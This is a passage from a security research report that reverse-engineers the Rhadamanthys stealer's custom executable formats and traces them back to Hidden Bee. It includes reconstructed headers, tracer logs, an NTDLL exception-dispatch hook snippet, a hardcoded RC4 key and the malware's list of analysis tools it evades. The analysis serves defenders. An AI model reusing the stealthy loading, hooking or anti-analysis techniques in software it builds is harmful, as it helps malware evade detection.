<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId50.png" alt="Figure 6: A hooked function RtlDispatchException within NTDLL. The
address marked red leads to the new, implanted module."/><figcaption class="wp-element-caption">Figure 6: A hooked function RtlDispatchException within NTDLL. The address marked red leads to the new, implanted module.</figcaption></figure>



<p>The redirection leads to the function denoted as&nbsp;<code>proxy_func</code>, which is within the NE module:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId53.png" alt="Figure 7: A proxy function within the NE module, where the hook
installed in NTDLL leads to"/><figcaption class="wp-element-caption">Figure 7: A proxy function within the NE module, where the hook installed in NTDLL leads to</figcaption></figure>



<p>The proxy function instruments the call to the&nbsp;<code>ZwQueryInformationProcess</code>&nbsp;and alters its result. First, the original version of the function is called. If it returns 0 (<code>STATUS_SUCCESS</code>), an additional flag is set on the output.</p>



<p>This method of handling exceptions from a custom module was documented in the following writeup:&nbsp;<a href="https://web.archive.org/web/20220522070336/https://hackmag.com/uncategorized/exceptions-for-hardcore-users/">https://web.archive.org/web/20220522070336/https://hackmag.com/uncategorized/exceptions-for-hardcore-users/</a></p>



<p>We can see that the proxy function used by the Hidden Bee module is identical to the one proposed in the mentioned article. Quoted snippet:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">NTSTATUS __stdcall xNtQueryInformationProcess(HANDLE ProcessHandle, INT ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength)
{
        NTSTATUS Status = org_NtQueryInformationProcess(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);

    if (!Status &amp;&amp; ProcessInformationClass == 0x22) /* ProcessExecuteFlags */
        *(PDWORD)ProcessInformation |= 0x20; /* ImageDispatchEnable */
    return Status;
}</pre>



<p>The above code enables the&nbsp;<code>ImageDispatchEnable</code>&nbsp;flag for the process, and as a result, the custom module is treated as a valid image (MEM_IMAGE), even though, in reality, it is loaded as MEM_PRIVATE. This simple trick is enough for the exception handlers to be found.</p>



<p><strong>Demo:</strong></p>



<p>We can see it reproduced in the following simplified PoC, which involves MS Detours as a hooking library and&nbsp;<a href="https://github.com/hasherezade/libpeconv">LibPEConv</a>&nbsp;as a manual loader:&nbsp;<a href="https://gist.github.com/hasherezade/3a9417377cacd893c580bdffb85292c1">https://gist.github.com/hasherezade/3a9417377cacd893c580bdffb85292c1</a>. We can test it by deploying a manually loaded executable that throws exceptions:&nbsp;<a href="https://github.com/hasherezade/libpeconv/blob/master/tests/test_case7/main.cpp">https://github.com/hasherezade/libpeconv/blob/master/tests/test_case7/main.cpp</a>. The result shows that, indeed, the exception handlers are properly executed:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" width="534" height="85" src="https://research.checkpoint.com/wp-content/uploads/2023/08/exceptions_poc.png" alt="" class="wp-image-28658" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/exceptions_poc.png 534w, https://research.checkpoint.com/wp-content/uploads/2023/08/exceptions_poc-300x48.png 300w" sizes="(max-width: 534px) 100vw, 534px" /><figcaption class="wp-element-caption">Figure 8: Demo of a manually loaded PE, where exception handlers are installed by the method analogous to the one used by the NE format. All handlers got properly executed.</figcaption></figure></div>


<p>Without the applied hook, any exception thrown from the manually loaded module causes a crash.</p>



<h3 class="wp-block-heading" id="the-ns-format">The NS format</h3>



<p>Way more interesting is the second format, starting with the magic “NS”. As we prove later, this is the basis of the formats that are now used for the Rhadamanthys components.</p>



<p>The visualization is shown below:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId65.png" alt="Figure 9: A diagram describing the NS format header. Source: [<a
href="/><figcaption class="wp-element-caption">Figure 9: A diagram describing the NS format header. Source: [<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">8</a>]</figcaption></figure>



<p>As we can see, the DOS header has been completely removed from the format. The information that is usually stored in the PE’s File Header and Optional Header was limited to the minimum and combined in a new structure. However, we still encounter some artifacts that resemble PE. Just after the NS identifier, comes the Machine ID, which has exactly the same value as the one from the PE’s File Header and is used to distinguish whether the module is 32 or 64-bit.</p>



<p>Next follows the minimized Data Directory, which contains only 6 records instead of the typical 16. The records are identical to the ones in the PE format: each contains RVA and Size, given as DWORDs. Directly after the Data Directory, there is a list of sections (the number of which is specified in the header). The records defining each section are a minimalist version of the ones from the PE format and contain only 4 fields: RVA, size, raw address, and characteristics.</p>



<p>While the records of the Data Directory are mostly unchanged, the way some of the structures are loaded and defined has been modified. The Import Table structure is slightly smaller compared to the original one from the PE format. It is implemented as a list of the following records:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId68.png" alt="Figure 10: The Import Table of an NS module. Source: [<a
href="/><figcaption class="wp-element-caption">Figure 10: The Import Table of an NS module. Source: [<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">8</a>]</figcaption></figure>



<p>The reconstructed header of the NS format:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const WORD NS_MAGIC = 0x534e;

namespace ns_exe {

    const size_t NS_DATA_DIR_COUNT = 6;

    enum data_dir_id {
        NS_IMPORTS = 1,
        NS_RELOCATIONS = 3,
        NS_IAT = 4
    };

    typedef struct {
        DWORD dir_va;
        DWORD dir_size;
    } t_NS_data_dir;

    typedef struct {
        DWORD va;
        DWORD size;
        DWORD raw_addr;
        DWORD characteristics;
    } t_NS_section;

    typedef struct {
        DWORD dll_name_rva;
        DWORD original_first_thunk;
        DWORD first_thunk;
        DWORD unknown;
    } t_NS_import;

    typedef struct NS_format {
        WORD magic; // 0x534e
        WORD machine_id;
        WORD sections_count;
        WORD hdr_size;
        DWORD entry_point;
        DWORD module_size;
        DWORD image_base;
        DWORD image_base_high;
        DWORD saved;
        DWORD unknown1;
        t_NS_data_dir data_dir[NS_DATA_DIR_COUNT];
        t_NS_section sections[SECTIONS_COUNT];
    } t_NS_format;

};</pre>



<p>The complete converter of the NS format is available at:</p>



<ul class="wp-block-list">
<li><a href="https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/ns_exe.cpp">https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/ns_exe.cpp</a></li>
</ul>



<h4 class="wp-block-heading" id="kernel-mode-ns-modules">Kernel mode NS modules</h4>



<p>While the custom executable formats are, in general, uncommon, even more unusual was to see them used for kernel mode modules.</p>



<p>The function presented below shows a fragment of the loader used by Hidden Bee (module&nbsp;<code>kloader.bin</code>), whose role is to load drivers in the custom format (NS):</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId72.png" alt="Figure 11: Fragment of the kernel-mode loader for NS format (Hidden
Bee, kloader.bin)"/><figcaption class="wp-element-caption">Figure 11: Fragment of the kernel-mode loader for NS format (Hidden Bee, kloader.bin)</figcaption></figure>



<p>To date, kernel mode modules haven’t been observed in Rhadamanthys. However, they show the authors’ diverse skills and how much they are invested in innovating various new formats.</p>



<h2 class="wp-block-heading" id="rhadamanthys-formats-rs-and-hs">Rhadamanthys formats: RS and HS</h2>



<p>Custom formats RS and HS have been observed in Rhadamanthys version 0.4.1, and below.</p>



<p>Looking at their structure, we can see an uncanny similarity to the previously mentioned NS format, to the point that modifying the original Hidden Bee converter to support them was a matter of a short time. In this part, we will present their internals.</p>



<h3 class="wp-block-heading" id="unpacking-the-custom-format">Unpacking the custom format</h3>



<p>Reaching the components in the custom formats may not be straightforward and requires some unpacking skills. The initial Rhadamanthys module is a PE file distributed to victims during malicious campaigns. It is usually wrapped in some&nbsp;<a href="https://www.malwarebytes.com/blog/news/2015/12/malware-crypters-the-deceptive-first-layer">packer/crypter</a>&nbsp;for additional protection. As Rhadamanthys is sold publicly and used by various distributors, the choice of which outer crypter is used may vary; hence, we will skip the related part. In many cases, we can quickly unpack it by&nbsp;<a href="https://github.com/hasherezade/mal_unpack">mal_unpack</a>/<a href="https://github.com/hasherezade/pe-sieve">PEsieve</a>.</p>



<p>Assuming that we got rid of the third-party layer, we are at the first Rhadamanthys executable (referred to as Stage 1). Tracing the application with&nbsp;<a href="https://github.com/hasherezade/tiny_tracer">Tiny Tracer</a>&nbsp;quickly allows to find the offsets that should draw our attention. Fragment of the tracelog:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">31f8;kernel32.HeapFree
326e;kernel32.HeapFree
3277;kernel32.HeapDestroy
1003;called: ?? [694000+730]
> 694000+9ff;kernel32.LocalAlloc
> 694000+7c9;kernel32.LocalAlloc
> 694000+96f;kernel32.LocalFree
> 694000+a44;kernel32.VirtualAlloc
> 694000+a88;kernel32.LocalFree
> 694000+a95;called: ?? [ca96000+1d4]
> ca96000+1de;called: ?? [ca95000+cae]
> ca95000+cff;called: ?? [ca96000+1e3]
> ca96000+1e8;called: ?? [ca95000+e73]
> ca95000+ecf;called: ?? [ca96000+1ed]</pre>



<p>Reading the above snippet, we can pinpoint two places where the execution got redirected to the next unnamed module (possibly shellcode). First, the redirection from the main module happens at RVA&nbsp;<strong>0x1003</strong>. Then, looking at the called functions (i.e.&nbsp;<code>VirtualAlloc</code>), we can assume there was another module unpacked by the first shellcode. The execution is redirected at shellcode’s offset&nbsp;<strong>0xA95</strong>.</p>



<p>If we set a breakpoint at the first offset, we can follow those transitions under the debugger.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId82.png" alt="Figure 12: The execution is redirected from the main module to the
shellcode"/><figcaption class="wp-element-caption">Figure 12: The execution is redirected from the main module to the shellcode</figcaption></figure>



<p>The revealed shellcode is responsible for unpacking, remapping, and running the next stage, which is in a custom executable format. The module is shipped in a compressed form:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId85.png" alt="Figure 13: Compressed RS module visible in memory"/><figcaption class="wp-element-caption">Figure 13: Compressed RS module visible in memory</figcaption></figure></div>


<p>The shellcode decompresses it first, and the interesting structure gets revealed:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId88.png" alt="Figure 14: The decompression function is executed, revealing the RS
module"/><figcaption class="wp-element-caption">Figure 14: The decompression function is executed, revealing the RS module</figcaption></figure>



<p>As we can see, the unpacked stage is the first module in a custom executable format,&nbsp;<code>RS</code>.</p>



<p>The shellcode remaps the RS module from raw to virtual format into the newly allocated, executable memory area. For this purpose, it uses the information about the sections that is stored in the custom RS header.</p>



<p>Next, the execution is redirected to the Entry Point of the new module. Note that the new component still depends on the data passed from Stage 1. Its start function expects two arguments. The first one is the module’s own base. The second is a data structure, with two pointers leading to important blocks of data.</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId91.png" alt="Figure 15: The data blocks from the Stage 1 propagated to the custom
module"/><figcaption class="wp-element-caption">Figure 15: The data blocks from the Stage 1 propagated to the custom module</figcaption></figure>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// passed structure with pointers to two data blocks
struct mod_data {
  _BYTE *compressed_data;
  _BYTE *url_config;
};</pre>



<p>One of the addresses points to the compressed data block. This is a package in a proprietary format and contains other modules to be loaded. It is an equivalent of the virtual filesystems implemented in Hidden Bee (more details later in the report).</p>



<p>The next component is a config, which contains the URL of the C2 that will be queried to download the next stage. The config is RC4 encrypted, using a 32-byte long, hardcoded key. For the analyzed cases, the key was:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">52 AB DF 06 B6 B1 3A C0 DA 2D 22 DC 6C D2 BE 6C 20 17 69 E0 12 B5 E6 EC 0E AB 4C 14 73 4A ED 51</pre>



<p>The decrypted config for the currently analyzed version has the following structure:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct config_data {
  DWORD rhy_magic; //!RHY
  DWORD flags;
  char next_key[16];
  char c2_url[1];
}</pre>



<p>This configuration is embedded into the Rhadamanthys&nbsp;<strong>Stage 1</strong>&nbsp;executable by the builder, which is a part of the toolkit sold to the distributors.</p>



<h4 class="wp-block-heading" id="the-rs-format">The RS format</h4>



<p>Following the steps described above, we were able to dump a complete executable in the RS format in its raw version. Let’s now analyze the structure and the way it is loaded so that we can convert it back to the PE.</p>



<p>The header of the RS format has many similarities with the NS format, known from Hidden Bee. The reconstructed structures are presented below:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">namespace rs_exe {

const size_t RS_DATA_DIR_COUNT = 3;

    enum data_dir_id {
        RS_IMPORTS = 0,
        RS_EXCEPTIONS,
        RS_RELOCATIONS = 2
    };

    typedef struct {
        DWORD dir_size;
        DWORD dir_va;
    } t_RS_data_dir;

    typedef struct {
        DWORD raw_addr;
        DWORD va;
        DWORD size;
    } t_RS_section;

    typedef struct {
        DWORD dll_name_rva;
        DWORD first_thunk;
        DWORD original_first_thunk;
    } t_RS_import;

    typedef struct {
        WORD magic; // 0x5352
        WORD machine_id;
        WORD sections_count;
        WORD hdr_size;
        DWORD entry_point;
        DWORD module_size;
        t_RS_data_dir data_dir[RS_DATA_DIR_COUNT];
        t_RS_section sections[SECTIONS_COUNT];
    } t_RS_format;

};</pre>



<p>As we could see under the debugger, the first steps required for loading the format are taken by the intermediary shellcode. It remaps the module from the raw format (which is more condensed) into the virtual one (ready to be executed). The reconstruction of the function responsible:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId94.png" alt="Figure 16: The function within the shellcode - unpacking the RS
module and preparing it to be executed"/><figcaption class="wp-element-caption">Figure 16: The function within the shellcode &#8211; unpacking the RS module and preparing it to be executed</figcaption></figure>



<p>Analyzing the above function, we can see that the shellcode decompresses the passed block of data, revealing the RS module in its raw form. The RS header is then parsed to obtain some needed information. First, a memory for the virtual image is allocated. The sections are then copied in a loop to that memory. This mechanism is very similar to the equivalent stage of PE loading. After the mapping is done, the Entry Point from the header is fetched, and the execution is passed there. This is where the intermediary shellcode’s role ends. The module itself proceeds with the remaining steps required for its own loading. Let’s have a look at the start function of the RS module:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId97.png" alt="Figure 17: The start function of the RS module"/><figcaption class="wp-element-caption">Figure 17: The start function of the RS module</figcaption></figure></div>


<p>The first few functions are exactly what we can expect in case of module loading, but they are implemented following the custom format. After the loading is finished, the module erases its own header in order to make it more difficult to dump and reconstruct it from memory.</p>



<p>Looking at the overall structure of the start function, we can see some similarities to the analogous functions of the Hidden Bee modules.</p>



<p>The first function that is called at the start is to apply relocations &#8211; adjusting each absolute address in the module to the actual load base. The format used for relocation blocks doesn’t differ from the PE standard (it is the only artifact that was left unchanged for now), so we omit the detailed description.</p>



<p>The next important function is for resolving all needed imports. The overview:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId100.png" alt="Figure 18: RS format imports loading function"/><figcaption class="wp-element-caption">Figure 18: RS format imports loading function</figcaption></figure></div>


<p>As we know, functions imported from external libraries can be fetched in two ways: by names or by ordinals. Names stored in a binary can give a lot of hints about the module’s functionality, so malware authors often try to hide them. A popular technique to achieve this goal is by using hashes/checksums of the names. This is also implemented in the current format. In the case of functions that are expected to be loaded by name, the original string is erased and replaced by its checksum (that is, a DWORD stored at the corresponding offset of&nbsp;<code>PIMAGE_IMPORT_BY_NAME</code>). Upon loading, the actual name is searched by the checksum and then used as an argument to the standard WinAPI function&nbsp;<code>GetProcAddress</code>.</p>



<p>Next, we can see the implementation of custom exception handling. The solution used is identical to the one from the previously described NE format of Hidden Bee (for more details, see “Handling exceptions from a custom module&#8221;).</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId103.png" alt="Figure 19: The function patching exception dispatcher within NTDLL.
More details in “Handling exceptions from a custom module”"/><figcaption class="wp-element-caption">Figure 19: The function patching exception dispatcher within NTDLL. More details in “Handling exceptions from a custom module”</figcaption></figure>



<p>An address of a call to&nbsp;<code>ZwQueryInformationProcess</code>&nbsp;was replaced, and now it points to the virtual offset&nbsp;<strong>0x595e</strong>&nbsp;in the Rhadamanthys module.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img fetchpriority="high" decoding="async" width="549" height="511" src="https://research.checkpoint.com/wp-content/uploads/2023/08/redirected.png" alt="" class="wp-image-28660" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/redirected.png 549w, https://research.checkpoint.com/wp-content/uploads/2023/08/redirected-300x279.png 300w" sizes="(max-width: 549px) 100vw, 549px" /><figcaption class="wp-element-caption">Figure 20: The fragment of the function within the modified NTDLL, viewed by IDA. An address of a function was replaced to redirect execution into the function within the Rhadamanthys module.</figcaption></figure></div>


<p>The function where the redirection leads is identical to what we saw in the case of Hidden Bee:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId109.png" alt="Figure 21: The proxy function for ZwQueryInformationProcess: sets the
“ImageDispatchEnable” flag for the process"/><figcaption class="wp-element-caption">Figure 21: The proxy function for ZwQueryInformationProcess: sets the “ImageDispatchEnable” flag for the process</figcaption></figure>



<p>After all the steps related to module loading, the main function, responsible for the core functionality of the module, is called. The details of the functionality are described in a later chapter.</p>



<p>The complete converter of the RS format is available here:</p>



<ul class="wp-block-list">
<li><a href="https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/rs_exe.cpp">https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/rs_exe.cpp</a></li>
</ul>



<p><strong>Demo</strong></p>



<p>Converting the RS module (raw format) dumped from memory into PE:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId113.png" alt="Figure 22: Demo - using a prepared converter on the dumped RS module
to obtain a PE"/><figcaption class="wp-element-caption">Figure 22: Demo &#8211; using a prepared converter on the dumped RS module to obtain a PE</figcaption></figure>



<p><em>The input RS file:&nbsp;<a href="https://www.virustotal.com/gui/file/f336cd910b9cfbe13a5d94fcdbac1be9c901a2dfd7ac0da82fbb9e8a096ac212">f9051752a96a6ffaa00760382900f643</a></em></p>



<p>The resulting output is a PE file, which can be further analyzed using typical tools, such as IDA.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId117.png" alt="Figure 23: Preview of the converted module (view from PE-bear)"/><figcaption class="wp-element-caption">Figure 23: Preview of the converted module (view from PE-bear)</figcaption></figure></div>


<h3 class="wp-block-heading" id="the-hs-format">The HS format</h3>



<p>A similar, yet not identical, format is used for the modules that are unpacked by the Stage 2 main component (that is in the RS format described above). The HS format may also be used for the modules from the package downloaded from the C2.</p>



<p>Example &#8211; Stage 2 unpacks the embedded HS module: “<strong>unhook.bin</strong>”</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId122.png" alt="Figure 24: The RS module unpacking the HS module from the embedded
package"/><figcaption class="wp-element-caption">Figure 24: The RS module unpacking the HS module from the embedded package</figcaption></figure>



<p>The header of the HS format:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const WORD HS_MAGIC = 0x5348;

namespace hs_exe {

const size_t HS_DATA_DIR_COUNT = 3;

    enum data_dir_id {
        HS_IMPORTS = 0,
        HS_EXCEPTIONS,
        HS_RELOCATIONS = 2
    };

    typedef struct {
        DWORD dir_va;
        DWORD dir_size;
    } t_HS_data_dir;

    typedef struct {
        DWORD va;
        DWORD size;
        DWORD raw_addr;
    } t_HS_section;

    typedef struct {
        DWORD dll_name_rva;
        DWORD original_first_thunk;
        DWORD first_thunk;
    } t_HS_import;

    typedef struct {
        WORD magic; // 0x5352
        WORD machine_id;
        WORD sections_count;
        WORD hdr_size;
        DWORD entry_point;
        DWORD module_size;
        DWORD unk1;
        DWORD module_base_high;
        DWORD module_base_low;
        DWORD unk2;
        t_HS_data_dir data_dir[HS_DATA_DIR_COUNT];
        t_HS_section sections[SECTIONS_COUNT];
    } t_HS_format;

};</pre>



<p>Some of the fields of the header were rearranged, yet this format is not that different from the previous one. One subtle difference is that this module allows for storing the original Module Base; in the RS format equivalent field does not exist, and 0 is used as a default base.</p>



<p>In some aspects, the HS format is simpler than the former one. For example, the import table is implemented exactly like in the Hidden Bee’s NE format, which resembles more of the one typical for PE. In the RS format, the names of imported functions are erased and loaded by hashes. Here, the original strings are preserved.</p>



<p>The complete converter of the HS format is available here:</p>



<ul class="wp-block-list">
<li><a href="https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/hs_exe.cpp">https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/hs_exe.cpp</a></li>
</ul>



<h2 class="wp-block-heading" id="rhadamanthys-latest-format-xs">Rhadamanthys’ latest format: XS</h2>



<p>Recently observed samples of Rhadamanthys (version 0.4.5 and higher) bring another update to the custom formats. The&nbsp;<code>RS</code>&nbsp;format, as well as the&nbsp;<code>HS</code>, are replaced by a reworked version with an&nbsp;<code>XS</code>&nbsp;magic. This new format has two variants.</p>



<p>The first set of components that makes up Stage 2 of the malware (shipped in the initial binary) comes in a format that we denote as XS1. As we learn later, there is another variant with the same magic but with a slightly modified header. It is used for the Stage 3, which is downloaded from the C2: containing the main stealer component and its submodules. The latter format we denote as XS2.</p>



<h3 class="wp-block-heading" id="unpacking-the-custom-format-1">Unpacking the custom format</h3>



<p>Analogously to the previous case, let’s start with an overview of how to obtain the first custom module. We can jump right into the interesting offsets by tracing the Rhadamanthys Stage 1 PE with&nbsp;<a href="https://github.com/hasherezade/tiny_tracer">Tiny Tracer</a>. The resulting tracelog is available&nbsp;<a href="https://gist.github.com/hasherezade/1aeace26a02b9eb0f50b05eea3b67949">here</a>.</p>



<p>This time, before the vital part is unpacked, the main executable examines its environment by enumerating running processes and comparing them against the list of known analysis tools:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">procexp.exe
procexp64.exe
tcpview.exe
tcpview64.exe
Procmon.exe
Procmon64.exe
vmmap.exe
vmmap64.exe
portmon.exe
processlasso.exe
Wireshark.exe
Fiddler Everywhere.exe
Fiddler.exe
ida.exe
ida64.exe
ImmunityDebugger.exe
WinDump.exe
x64dbg.exe
x32dbg.exe
OllyDbg.exe
ProcessHacker.exe
idaq64.exe
autoruns.exe
dumpcap.exe
de4dot.exe
hookexplorer.exe
ilspy.exe
lordpe.exe
dnspy.exe
petools.exe
autorunsc.exe
resourcehacker.exe
filemon.exe
regmon.exe
windanr.exe</pre>



<p>If any process from the list is detected, the sample exits.</p>



<p>Otherwise, it proceeds by unpacking the next stage shellcode, which is very similar to the one used by the previous version. Next, it redirects the execution there. As we can see from the TinyTracer tracelog, the first shellcode is called at RVA&nbsp;<strong>0x2459</strong>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">2459;called: ?? [11790000+0]
> 11790000+2fe;kernel32.LocalAlloc
> 11790000+ba;kernel32.LocalAlloc
> 11790000+260;kernel32.LocalFree
> 11790000+34c;kernel32.VirtualAlloc
> 11790000+3a4;kernel32.VirtualProtect
> 11790000+3bb;kernel32.LocalFree
> 11790000+52;called: ?? [f991000+88]
> f991000+80;called: ?? [f995000+d4d]
> f995000+d58;called: ?? [f998000+0]
> f998000+ca;called: ?? [f995000+d5d]</pre>



<p>Further on, there is a transition to a region allocated from within the first shellcode. Again, we can observe those transitions under the debugger.</p>



<p>First, setting the breakpoint at RVA&nbsp;<strong>0x2459</strong>&nbsp;in the main sample, we can find the shellcode being called:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId129.png" alt="Figure 25: The Stage 1 module redirecting the execution into the
intermediary shellcode"/><figcaption class="wp-element-caption">Figure 25: The Stage 1 module redirecting the execution into the intermediary shellcode</figcaption></figure>



<p><em>The dumped memory region:&nbsp;<a href="https://www.virustotal.com/gui/file/de0541a54e0ad2e5cc1344769beb9d9fcf0a55212057a9df891fa9f2ed7ab631/detection">806821eb9bb441addc2186d6156c57bf</a></em></p>



<p>Not much about the functionality of this shellcode has changed compared to the previous version. Once again, it is responsible for unpacking the next stage and redirecting the execution there. We can dump the raw XS module right after it is decompressed:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId133.png" alt="Figure 26: The decompression function within the shellcode reveals
the module in the XS format"/><figcaption class="wp-element-caption">Figure 26: The decompression function within the shellcode reveals the module in the XS format</figcaption></figure>



<p>We’ll examine the dumped module later.</p>



<p><em>Example of the dumped XS module:&nbsp;<a href="https://www.virustotal.com/gui/file/0c0753affec66ea02d4e93ced63f95e6c535dc7d7afb7fcd7e75a49764fbef0d/detection">9f0bb1689df57c3c25d3d488bf70a1fa</a></em></p>



<h3 class="wp-block-heading" id="the-xs-format-variant-1">The XS format: Variant 1</h3>



<p>As mentioned earlier, there are two slightly different variants of the XS format. Let’s start with the first one used for the initial set of components, including the module we unpacked in the section above.</p>



<p>The reconstructed structure of the header:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct xs_section
{
  _DWORD rva;
  _DWORD raw;
  _DWORD size;
  _DWORD flags;
};

struct xs1_data_dir
{
  _DWORD size;
  _DWORD rva;
};

struct xs1_format
{
  _WORD magic;
  _WORD nt_magic;
  _WORD sections_count;
  _WORD imp_key;
  _WORD header_size;
  _WORD unk_3;
  _DWORD module_size;
  _DWORD entry_point;
  xs1_data_dir imports;
  xs1_data_dir exceptions;
  xs1_data_dir relocs;
  xs_section sections[SECTIONS_COUNT];
};

struct xs1_import
{
  _DWORD dll_name_rva;
  _DWORD first_thunk;
  _DWORD original_first_thunk;
  _BYTE obf_dll_len[4];
};</pre>



<p>As before, the module is decompressed and then mapped by the intermediary shellcode:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" width="842" height="333" src="https://research.checkpoint.com/wp-content/uploads/2023/08/loading_xs1.png" alt="" class="wp-image-28663" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/loading_xs1.png 842w, https://research.checkpoint.com/wp-content/uploads/2023/08/loading_xs1-300x119.png 300w, https://research.checkpoint.com/wp-content/uploads/2023/08/loading_xs1-768x304.png 768w" sizes="(max-width: 842px) 100vw, 842px" /><figcaption class="wp-element-caption">Figure 27: The intermediary shellcode (<a href="https://www.virustotal.com/gui/file/de0541a54e0ad2e5cc1344769beb9d9fcf0a55212057a9df891fa9f2ed7ab631/detection">806821eb9bb441addc2186d6156c57bf</a>) unpacks and maps the XS1 module</figcaption></figure></div>


<p>After remapping the XS module from the raw format to the virtual one, it redirects the execution to the module’s Entry Point.</p>



<p>The overview of the start function of the XS module is shown below.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId141.png" alt="Figure 28: The start function of the XS module."/><figcaption class="wp-element-caption">Figure 28: The start function of the XS module.</figcaption></figure></div>


<p>Compared to the previously used RS format, there are several changes besides the simple rearrangements of the fields and the addition of some new fields.</p>



<p>The first modification concerns how the format is recognized as either 32-bit or 64-bit. In the PE format, there are two different fields that we can use to distinguish between them. The first one is the “Machine” field in the FileHeader. The other is “Magic” in the Optional Header. The copy of the “Machine” field was used previously in the Hidden Bee and Rhadamanthys custom formats. This time the author replaced it with the alternative and used the “Optional Header → Magic”.</p>



